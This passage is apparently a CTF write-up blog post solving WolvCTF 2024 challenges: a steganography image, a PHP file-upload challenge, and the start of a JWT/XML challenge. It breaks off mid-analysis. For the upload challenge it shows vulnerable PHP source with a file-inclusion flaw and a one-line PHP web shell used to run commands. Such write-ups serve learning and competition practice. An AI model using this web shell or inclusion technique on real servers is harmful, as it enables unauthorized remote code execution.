@@ -1,0 +1,648 @@
+<!doctype html><html class="not-ready lg:text-base" style=--bg:#faf8f1 lang=en-us dir=ltr><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>WolvCTF 2024 - Writeups - Stephenx0r - CTF Writeups</title><meta name=theme-color><meta name=description content="This is a writeup for , forensics and web challenges from WolvCTF 2024
+Forensics: Hidden Data [Beginner]
+Question: WOLPHV sent me this file. Not sure what to comment about it
+Flag: wctf{h1dd3n_d4t4_n0T_s0_h1dD3N}
+We are given an image of the CTF logo. Just use Aperi&rsquo;Solve and the flag can be found within its data.
+
+WEB: Upload Fun
+Description: I made a website where you can upload files.
+We are given a url on visting it we get php code."><meta name=author content="Stephenx0r - CTF Writeups"><link rel="preload stylesheet" as=style href=https://stephenx0r.github.io/main.min.css><link rel=preload as=image href=https://stephenx0r.github.io/theme.png><link rel=preload as=image href=https://stephenx0r.github.io/github.svg><link rel=preload as=image href=https://stephenx0r.github.io/linkedin.svg><script defer src=https://stephenx0r.github.io/highlight.min.js onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://stephenx0r.github.io/favicon.ico><link rel=apple-touch-icon href=https://stephenx0r.github.io/apple-touch-icon.png><meta name=generator content="Hugo 0.150.1"><meta itemprop=name content="WolvCTF 2024 - Writeups"><meta itemprop=description content="This is a writeup for , forensics and web challenges from WolvCTF 2024
+Forensics: Hidden Data [Beginner] Question: WOLPHV sent me this file. Not sure what to comment about it
+Flag: wctf{h1dd3n_d4t4_n0T_s0_h1dD3N}
+We are given an image of the CTF logo. Just use Aperi’Solve and the flag can be found within its data.
+WEB: Upload Fun Description: I made a website where you can upload files.
+We are given a url on visting it we get php code."><meta itemprop=datePublished content="2024-03-20T12:00:00+00:00"><meta itemprop=dateModified content="2024-03-20T12:00:00+00:00"><meta itemprop=wordCount content="3492"><meta itemprop=keywords content="Beginner,Forensics,Osint,Wolv,Jwt"><meta property="og:url" content="https://stephenx0r.github.io/posts/2024-03-17-wolvctf2024/"><meta property="og:site_name" content="Stephenx0r - CTF Writeups"><meta property="og:title" content="WolvCTF 2024 - Writeups"><meta property="og:description" content="This is a writeup for , forensics and web challenges from WolvCTF 2024
+Forensics: Hidden Data [Beginner] Question: WOLPHV sent me this file. Not sure what to comment about it
+Flag: wctf{h1dd3n_d4t4_n0T_s0_h1dD3N}
+We are given an image of the CTF logo. Just use Aperi’Solve and the flag can be found within its data.
+WEB: Upload Fun Description: I made a website where you can upload files.
+We are given a url on visting it we get php code."><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-03-20T12:00:00+00:00"><meta property="article:modified_time" content="2024-03-20T12:00:00+00:00"><meta property="article:tag" content="Beginner"><meta property="article:tag" content="Forensics"><meta property="article:tag" content="Osint"><meta property="article:tag" content="Wolv"><meta property="article:tag" content="Jwt"><meta name=twitter:card content="summary"><meta name=twitter:title content="WolvCTF 2024 - Writeups"><meta name=twitter:description content="This is a writeup for , forensics and web challenges from WolvCTF 2024
+Forensics: Hidden Data [Beginner] Question: WOLPHV sent me this file. Not sure what to comment about it
+Flag: wctf{h1dd3n_d4t4_n0T_s0_h1dD3N}
+We are given an image of the CTF logo. Just use Aperi’Solve and the flag can be found within its data.
+WEB: Upload Fun Description: I made a website where you can upload files.
+We are given a url on visting it we get php code."><link rel=canonical href=https://stephenx0r.github.io/posts/2024-03-17-wolvctf2024/></head><body class="bg-(--bg) text-black antialiased duration-200 ease-out [-webkit-tap-highlight-color:transparent] dark:text-white"><header class="mx-auto flex h-[4.5rem] max-w-(--w) px-8 whitespace-nowrap lg:justify-center"><div class="relative z-50 flex items-center ltr:mr-auto rtl:ml-auto"><a class="-translate-y-[1px] text-2xl font-medium" href=https://stephenx0r.github.io/>Stephenx0r - CTF Writeups</a><div class="btn-dark text-[0px] ltr:ml-4 rtl:mr-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]" role=button aria-label=Dark></div></div><div class="btn-menu relative z-50 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden ltr:-mr-8 rtl:-ml-8" role=button aria-label=Menu></div><script>const htmlClass=document.documentElement.classList;setTimeout(()=>{htmlClass.remove("not-ready")},10);const btnMenu=document.querySelector(".btn-menu");btnMenu.addEventListener("click",()=>{htmlClass.toggle("open")});const metaTheme=document.querySelector('meta[name="theme-color"]'),lightBg="#faf8f1".replace(/"/g,""),setDark=e=>{metaTheme.setAttribute("content",e?"#000":lightBg),htmlClass[e?"add":"remove"]("dark"),localStorage.setItem("dark",e)},darkScheme=window.matchMedia("(prefers-color-scheme: dark)");if(htmlClass.contains("dark"))setDark(!0);else{const e=localStorage.getItem("dark");setDark(e?e==="true":darkScheme.matches)}darkScheme.addEventListener("change",e=>{setDark(e.matches)});const btnDark=document.querySelector(".btn-dark");btnDark.addEventListener("click",()=>{setDark(localStorage.getItem("dark")!=="true")})</script><div class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full flex-col justify-center bg-(--bg) pb-16 duration-200 select-none lg:static lg:h-auto lg:flex-row lg:bg-transparent! lg:pb-0 lg:transition-none"><nav class="mt-12 flex justify-center space-x-10 lg:mt-0 lg:items-center ltr:lg:ml-14 rtl:space-x-reverse rtl:lg:mr-14 dark:invert"><a class="h-7 w-7 text-[0px] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6" style=--url:url(./github.svg) href=https://github.com/Stephenx0r target=_blank rel=me>github</a>
+<a class="h-7 w-7 text-[0px] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6" style=--url:url(./linkedin.svg) href=https://linkedin.com/in/stephengathumbi target=_blank rel=me>linkedin</a></nav></div></header><main class="prose prose-neutral dark:prose-invert relative mx-auto min-h-[calc(100vh-9rem)] max-w-(--w) px-8 pt-14 pb-16"><article><header class=mb-14><h1 class="my-0! pb-2.5">WolvCTF 2024 - Writeups</h1><div class="text-xs antialiased opacity-60"><time>Mar 20, 2024</time></div></header><section><p>This is a writeup for , forensics and web challenges from WolvCTF 2024</p><h2 id=forensics-hidden-data-beginner>Forensics: Hidden Data [Beginner]</h2><p>Question: WOLPHV sent me this file. Not sure what to comment about it</p><p>Flag: <code>wctf{h1dd3n_d4t4_n0T_s0_h1dD3N}</code></p><p>We are given an image of the CTF logo. Just use Aperi&rsquo;Solve and the flag can be found within its data.</p><p><img src=/assets/posts/wolvctf2024/beginner1.png alt=beginner1.png></p><h2 id=web-upload-fun>WEB: Upload Fun</h2><p>Description: I made a website where you can upload files.</p><p>We are given a url on visting it we get php code.</p><p>We notice we can make POST and GET requests to the server.
+It seems we are restricted to files with .. in thier filename. We notice also the filename is uploaded to the server with a random 256 hash which we cannot guess outright.</p><p>We can upload a file name with the maximum number of characters to trigger an error and potentially leak the hash of the file. <em>MAXIMUM NUMBER OF CHARACTERS OF A FILENAME IS 255</em></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=ln> 1</span><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=ln> 2</span><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;REQUEST_METHOD&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;POST&#34;</span><span class=p>){</span>
+</span></span><span class=line><span class=ln> 3</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;f&#34;</span><span class=p>][</span><span class=s2>&#34;size&#34;</span><span class=p>]</span> <span class=o>&gt;</span> <span class=mi>1000</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 4</span><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;file too large&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 5</span><span class=cl>            <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 6</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln> 7</span><span class=cl>
+</span></span><span class=line><span class=ln> 8</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>str_contains</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;f&#34;</span><span class=p>][</span><span class=s2>&#34;name&#34;</span><span class=p>],</span> <span class=s2>&#34;..&#34;</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 9</span><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;no .. in filename please&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>10</span><span class=cl>            <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>11</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln>12</span><span class=cl>
+</span></span><span class=line><span class=ln>13</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=k>empty</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;f&#34;</span><span class=p>])){</span>
+</span></span><span class=line><span class=ln>14</span><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;empty file&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>15</span><span class=cl>            <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>16</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln>17</span><span class=cl>
+</span></span><span class=line><span class=ln>18</span><span class=cl>        <span class=nv>$ip</span> <span class=o>=</span> <span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;REMOTE_ADDR&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=ln>19</span><span class=cl>        <span class=nv>$flag</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;/flag.txt&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>20</span><span class=cl>        <span class=nv>$hash</span> <span class=o>=</span> <span class=nx>hash</span><span class=p>(</span><span class=s1>&#39;sha256&#39;</span><span class=p>,</span> <span class=nv>$flag</span> <span class=o>.</span> <span class=nv>$ip</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>21</span><span class=cl>
+</span></span><span class=line><span class=ln>22</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>move_uploaded_file</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;f&#34;</span><span class=p>][</span><span class=s2>&#34;tmp_name&#34;</span><span class=p>],</span> <span class=s2>&#34;./uploads/&#34;</span> <span class=o>.</span> <span class=nv>$hash</span> <span class=o>.</span> <span class=s2>&#34;_&#34;</span> <span class=o>.</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;f&#34;</span><span class=p>][</span><span class=s2>&#34;name&#34;</span><span class=p>]))</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>23</span><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;upload success&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>24</span><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>25</span><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;upload error&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>26</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln>27</span><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>28</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;f&#34;</span><span class=p>]))</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>29</span><span class=cl>            <span class=nv>$path</span> <span class=o>=</span> <span class=s2>&#34;./uploads/&#34;</span> <span class=o>.</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;f&#34;</span><span class=p>];</span>
+</span></span><span class=line><span class=ln>30</span><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>str_contains</span><span class=p>(</span><span class=nv>$path</span><span class=p>,</span> <span class=s2>&#34;..&#34;</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>31</span><span class=cl>                <span class=k>echo</span> <span class=s2>&#34;no .. in f please&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>32</span><span class=cl>                <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>33</span><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=ln>34</span><span class=cl>            <span class=k>include</span> <span class=nv>$path</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>35</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln>36</span><span class=cl>
+</span></span><span class=line><span class=ln>37</span><span class=cl>        <span class=nx>highlight_file</span><span class=p>(</span><span class=s2>&#34;index.php&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>38</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln>39</span><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></div><p>I crafted a payload in burpsuite for POST request to the server</p><p><img src=/assets/posts/wolvctf2024/upload-fun1.png alt=upload-fun1.png></p><p>We get the leaked hash in the response</p><p><img src=/assets/posts/wolvctf2024/upload-fun2.png alt=upload-fun2.png></p><p>Testing if we can execute php codes
+<img src=/assets/posts/wolvctf2024/upload-fun5.png alt=upload-fun5.png>
+<img src=/assets/posts/wolvctf2024/upload-fun6.png alt=upload-fun6.png>
+Yes we can</p><p>We can now proceed and craft a parameter to execute our commands and upload it to our server</p><p><code>&lt;?php system($_GET["some"]); ?></code>
+<img src=/assets/posts/wolvctf2024/upload-fun4.png alt=upload-fun4.png></p><p>Making a request to the server through our some parameter
+<img src=/assets/posts/wolvctf2024/upload-fun3.png alt=upload-fun3.png>
+Flag: <code>wctf{h0w_d1d_y0u_gu355_th3_f1l3n4me?_7523015134}</code></p><h2 id=web--username>WEB: Username</h2><p>When you go to the challenge page, you are prompted to register your username</p><p>Here is the source:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=ln> 1</span><span class=cl>
+</span></span><span class=line><span class=ln> 2</span><span class=cl><span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=ln> 3</span><span class=cl>
+</span></span><span class=line><span class=ln> 4</span><span class=cl><span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=ln> 5</span><span class=cl>
+</span></span><span class=line><span class=ln> 6</span><span class=cl>    <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>Register<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=ln> 7</span><span class=cl>
+</span></span><span class=line><span class=ln> 8</span><span class=cl><span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=ln> 9</span><span class=cl>
+</span></span><span class=line><span class=ln>10</span><span class=cl><span class=p>&lt;</span><span class=nt>h1</span><span class=p>&gt;</span>Please register your username:<span class=p>&lt;/</span><span class=nt>h1</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=ln>11</span><span class=cl>
+</span></span><span class=line><span class=ln>12</span><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;/register&#34;</span> <span class=na>method</span><span class=o>=</span><span class=s>&#34;POST&#34;</span> <span class=na>enctype</span><span class=o>=</span><span class=s>&#34;application/x-www-form-urlencoded&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=ln>13</span><span class=cl>
+</span></span><span class=line><span class=ln>14</span><span class=cl>    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;text&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;username&#34;</span><span class=p>/&gt;</span>
+</span></span><span class=line><span class=ln>15</span><span class=cl>
+</span></span><span class=line><span class=ln>16</span><span class=cl>    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;submit&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;Submit&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=ln>17</span><span class=cl>
+</span></span><span class=line><span class=ln>18</span><span class=cl><span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=ln>19</span><span class=cl>
+</span></span><span class=line><span class=ln>20</span><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
+</span></span></code></pre></div><p>Submitting the form causes the following request/response:</p><p><strong>Request</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln> 1</span><span class=cl>
+</span></span><span class=line><span class=ln> 2</span><span class=cl>POST /register HTTP/2
+</span></span><span class=line><span class=ln> 3</span><span class=cl>
+</span></span><span class=line><span class=ln> 4</span><span class=cl>Host: username-okntin33tq-ul.a.run.app
+</span></span><span class=line><span class=ln> 5</span><span class=cl>
+</span></span><span class=line><span class=ln> 6</span><span class=cl>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
+</span></span><span class=line><span class=ln> 7</span><span class=cl>
+</span></span><span class=line><span class=ln> 8</span><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span></span><span class=line><span class=ln> 9</span><span class=cl>
+</span></span><span class=line><span class=ln>10</span><span class=cl>Accept-Language: en-US,en;q=0.5
+</span></span><span class=line><span class=ln>11</span><span class=cl>
+</span></span><span class=line><span class=ln>12</span><span class=cl>Accept-Encoding: gzip, deflate, br
+</span></span><span class=line><span class=ln>13</span><span class=cl>
+</span></span><span class=line><span class=ln>14</span><span class=cl>Content-Type: application/x-www-form-urlencoded
+</span></span><span class=line><span class=ln>15</span><span class=cl>
+</span></span><span class=line><span class=ln>16</span><span class=cl>Content-Length: 12
+</span></span><span class=line><span class=ln>17</span><span class=cl>
+</span></span><span class=line><span class=ln>18</span><span class=cl>Origin: https://username-okntin33tq-ul.a.run.app
+</span></span><span class=line><span class=ln>19</span><span class=cl>
+</span></span><span class=line><span class=ln>20</span><span class=cl>Referer: https://username-okntin33tq-ul.a.run.app/
+</span></span><span class=line><span class=ln>21</span><span class=cl>
+</span></span><span class=line><span class=ln>22</span><span class=cl>Upgrade-Insecure-Requests: 1
+</span></span><span class=line><span class=ln>23</span><span class=cl>
+</span></span><span class=line><span class=ln>24</span><span class=cl>Sec-Fetch-Dest: document
+</span></span><span class=line><span class=ln>25</span><span class=cl>
+</span></span><span class=line><span class=ln>26</span><span class=cl>Sec-Fetch-Mode: navigate
+</span></span><span class=line><span class=ln>27</span><span class=cl>
+</span></span><span class=line><span class=ln>28</span><span class=cl>Sec-Fetch-Site: same-origin
+</span></span><span class=line><span class=ln>29</span><span class=cl>
+</span></span><span class=line><span class=ln>30</span><span class=cl>Sec-Fetch-User: ?1
+</span></span><span class=line><span class=ln>31</span><span class=cl>
+</span></span><span class=line><span class=ln>32</span><span class=cl>Te: trailers
+</span></span><span class=line><span class=ln>33</span><span class=cl>
+</span></span><span class=line><span class=ln>34</span><span class=cl>  
+</span></span><span class=line><span class=ln>35</span><span class=cl>
+</span></span><span class=line><span class=ln>36</span><span class=cl>username=sam
+</span></span></code></pre></div><p><strong>Response</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln> 1</span><span class=cl>
+</span></span><span class=line><span class=ln> 2</span><span class=cl>HTTP/2 302 Found
+</span></span><span class=line><span class=ln> 3</span><span class=cl>
+</span></span><span class=line><span class=ln> 4</span><span class=cl>Content-Type: text/html; charset=utf-8
+</span></span><span class=line><span class=ln> 5</span><span class=cl>
+</span></span><span class=line><span class=ln> 6</span><span class=cl>Set-Cookie: appdata=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiPGRhdGE-PHVzZXJuYW1lPnNhbTwvdXNlcm5hbWU-PC9kYXRhPiJ9.bo6oHNQHDYUNg4wOgLsd7Ey2aKsNUPopUuDmagLpCEU; Path=/
+</span></span><span class=line><span class=ln> 7</span><span class=cl>
+</span></span><span class=line><span class=ln> 8</span><span class=cl>Location: /welcome
+</span></span><span class=line><span class=ln> 9</span><span class=cl>
+</span></span><span class=line><span class=ln>10</span><span class=cl>X-Cloud-Trace-Context: 43f8eebd7a72b2c81f0ead9c4ac2c554;o=1
+</span></span><span class=line><span class=ln>11</span><span class=cl>
+</span></span><span class=line><span class=ln>12</span><span class=cl>Date: Sun, 17 Mar 2024 18:19:15 GMT
+</span></span><span class=line><span class=ln>13</span><span class=cl>
+</span></span><span class=line><span class=ln>14</span><span class=cl>Server: Google Frontend
+</span></span><span class=line><span class=ln>15</span><span class=cl>
+</span></span><span class=line><span class=ln>16</span><span class=cl>Content-Length: 9
+</span></span><span class=line><span class=ln>17</span><span class=cl>
+</span></span><span class=line><span class=ln>18</span><span class=cl>Alt-Svc: h3=&#34;:443&#34;; ma=2592000,h3-29=&#34;:443&#34;; ma=2592000
+</span></span><span class=line><span class=ln>19</span><span class=cl>
+</span></span><span class=line><span class=ln>20</span><span class=cl>  
+</span></span><span class=line><span class=ln>21</span><span class=cl>
+</span></span><span class=line><span class=ln>22</span><span class=cl>hello sam
+</span></span></code></pre></div><p>Notice two things here:</p><ul><li><p>an <strong>appdata</strong> cookie is set</p></li><li><p>this is a 302 (redirect) response redirecting to <code>/welcome</code></p></li></ul><p>The browser then jumps to the <code>/welcome</code> resource which has this request/response:</p><p><strong>/welcome Request</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln> 1</span><span class=cl>
+</span></span><span class=line><span class=ln> 2</span><span class=cl>GET /welcome HTTP/2
+</span></span><span class=line><span class=ln> 3</span><span class=cl>
+</span></span><span class=line><span class=ln> 4</span><span class=cl>Host: username-okntin33tq-ul.a.run.app
+</span></span><span class=line><span class=ln> 5</span><span class=cl>
+</span></span><span class=line><span class=ln> 6</span><span class=cl>Cookie: appdata=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiPGRhdGE-PHVzZXJuYW1lPnNhbTwvdXNlcm5hbWU-PC9kYXRhPiJ9.bo6oHNQHDYUNg4wOgLsd7Ey2aKsNUPopUuDmagLpCEU
+</span></span><span class=line><span class=ln> 7</span><span class=cl>
+</span></span><span class=line><span class=ln> 8</span><span class=cl>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
+</span></span><span class=line><span class=ln> 9</span><span class=cl>
+</span></span><span class=line><span class=ln>10</span><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span></span><span class=line><span class=ln>11</span><span class=cl>
+</span></span><span class=line><span class=ln>12</span><span class=cl>Accept-Language: en-US,en;q=0.5
+</span></span><span class=line><span class=ln>13</span><span class=cl>
+</span></span><span class=line><span class=ln>14</span><span class=cl>Accept-Encoding: gzip, deflate, br
+</span></span><span class=line><span class=ln>15</span><span class=cl>
+</span></span><span class=line><span class=ln>16</span><span class=cl>Referer: https://username-okntin33tq-ul.a.run.app/
+</span></span><span class=line><span class=ln>17</span><span class=cl>
+</span></span><span class=line><span class=ln>18</span><span class=cl>Upgrade-Insecure-Requests: 1
+</span></span><span class=line><span class=ln>19</span><span class=cl>
+</span></span><span class=line><span class=ln>20</span><span class=cl>Sec-Fetch-Dest: document
+</span></span><span class=line><span class=ln>21</span><span class=cl>
+</span></span><span class=line><span class=ln>22</span><span class=cl>Sec-Fetch-Mode: navigate
+</span></span><span class=line><span class=ln>23</span><span class=cl>
+</span></span><span class=line><span class=ln>24</span><span class=cl>Sec-Fetch-Site: same-origin
+</span></span><span class=line><span class=ln>25</span><span class=cl>
+</span></span><span class=line><span class=ln>26</span><span class=cl>Sec-Fetch-User: ?1
+</span></span><span class=line><span class=ln>27</span><span class=cl>
+</span></span><span class=line><span class=ln>28</span><span class=cl>Te: trailers
+</span></span><span class=line><span class=ln>29</span><span class=cl>
+</span></span><span class=line><span class=ln>30</span><span class=cl>  
+</span></span></code></pre></div><p><strong>/welcome Response</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln> 1</span><span class=cl>
+</span></span><span class=line><span class=ln> 2</span><span class=cl>HTTP/2 200 OK
+</span></span><span class=line><span class=ln> 3</span><span class=cl>
+</span></span><span class=line><span class=ln> 4</span><span class=cl>Content-Type: text/html; charset=utf-8
+</span></span><span class=line><span class=ln> 5</span><span class=cl>
+</span></span><span class=line><span class=ln> 6</span><span class=cl>X-Cloud-Trace-Context: 5959be2418e677ee744754ce01280cb0
+</span></span><span class=line><span class=ln> 7</span><span class=cl>
+</span></span><span class=line><span class=ln> 8</span><span class=cl>Date: Sun, 17 Mar 2024 18:19:15 GMT
+</span></span><span class=line><span class=ln> 9</span><span class=cl>
+</span></span><span class=line><span class=ln>10</span><span class=cl>Server: Google Frontend
+</span></span><span class=line><span class=ln>11</span><span class=cl>
+</span></span><span class=line><span class=ln>12</span><span class=cl>Content-Length: 146
+</span></span><span class=line><span class=ln>13</span><span class=cl>
+</span></span><span class=line><span class=ln>14</span><span class=cl>Alt-Svc: h3=&#34;:443&#34;; ma=2592000,h3-29=&#34;:443&#34;; ma=2592000
+</span></span><span class=line><span class=ln>15</span><span class=cl>
+</span></span><span class=line><span class=ln>16</span><span class=cl>  
+</span></span><span class=line><span class=ln>17</span><span class=cl>
+</span></span><span class=line><span class=ln>18</span><span class=cl>&lt;html&gt;
+</span></span><span class=line><span class=ln>19</span><span class=cl>
+</span></span><span class=line><span class=ln>20</span><span class=cl>&lt;head&gt;
+</span></span><span class=line><span class=ln>21</span><span class=cl>
+</span></span><span class=line><span class=ln>22</span><span class=cl>    &lt;title&gt;Welcome&lt;/title&gt;
+</span></span><span class=line><span class=ln>23</span><span class=cl>
+</span></span><span class=line><span class=ln>24</span><span class=cl>&lt;/head&gt;
+</span></span><span class=line><span class=ln>25</span><span class=cl>
+</span></span><span class=line><span class=ln>26</span><span class=cl>&lt;h1&gt;Welcome&lt;/h1&gt;
+</span></span><span class=line><span class=ln>27</span><span class=cl>
+</span></span><span class=line><span class=ln>28</span><span class=cl>&lt;div&gt;Welcome sam&lt;/div&gt;
+</span></span><span class=line><span class=ln>29</span><span class=cl>
+</span></span><span class=line><span class=ln>30</span><span class=cl>&lt;!-- TODO: Decide if /app/app.py is ok to use --&gt;
+</span></span><span class=line><span class=ln>31</span><span class=cl>
+</span></span><span class=line><span class=ln>32</span><span class=cl>&lt;/html&gt;
+</span></span></code></pre></div><p>Notice</p><ul><li><p>the cookie (as expected) is sent to the <code>/welcome</code> resource.</p></li><li><p>the registered name appears in the page response</p></li><li><p>there is an HTML comment about /app/app.py</p></li></ul><p><strong>Note</strong>: It turns out there is an <code>/app/app.py</code> on the server and our goal is to eventually read the contents of that file somehow.</p><h3 id=jwt-analysis>JWT Analysis</h3><p>Those with more web experience will immediately notice the cookie as a JWT (JSON Web Token).</p><p>There are all kinds of resources online to learn more about JWTs.</p><p>A dead giveaway is:</p><ul><li><p>it has three islands of text separated by two periods</p></li><li><p>first two islands starts with <code>eyJ</code></p></li></ul><p>A great place to decode a JWT is at <a href=https://jwt.io>jwt.io</a></p><p>When you paste the JWT into jwt.io, you&rsquo;ll see something like this:</p><p><img src=/assets/posts/wolvctf2024/image-20240317143303096.png alt=image-20240317143303096></p><p>The HEADER on the right is just telling you:</p><ul><li><p>the signing algorithm is HS256</p></li><li><p>it really is a JWT (although this &ldquo;typ&rdquo; is optional according to the spec)</p></li></ul><p>This is decoded from the base64 red text on the left:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln>1</span><span class=cl>
+</span></span><span class=line><span class=ln>2</span><span class=cl>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
+</span></span></code></pre></div><p><strong>Note</strong>: By design, JWTs never include any trailing =&rsquo;s like you often see as padding characters in base64.</p><p>The PAYLOAD is always JSON.  The PAYLOAD is not encrypted by design.  (so never put anything secret inside it)</p><p>In the language of JWTs, this PAYLOAD has one &ldquo;claim&rdquo;:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln>1</span><span class=cl>
+</span></span><span class=line><span class=ln>2</span><span class=cl>data: &lt;data&gt;&lt;username&gt;sam&lt;/username&gt;&lt;/data&gt;
+</span></span></code></pre></div><p>You can see that the data field is really just a small snippet of XML with &ldquo;sam&rdquo; insise the username element.</p><p>This is decoded from the purple base64 text on the left:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln>1</span><span class=cl>
+</span></span><span class=line><span class=ln>2</span><span class=cl>eyJkYXRhIjoiPGRhdGE-PHVzZXJuYW1lPnNhbTwvdXNlcm5hbWU-PC9kYXRhPiJ9
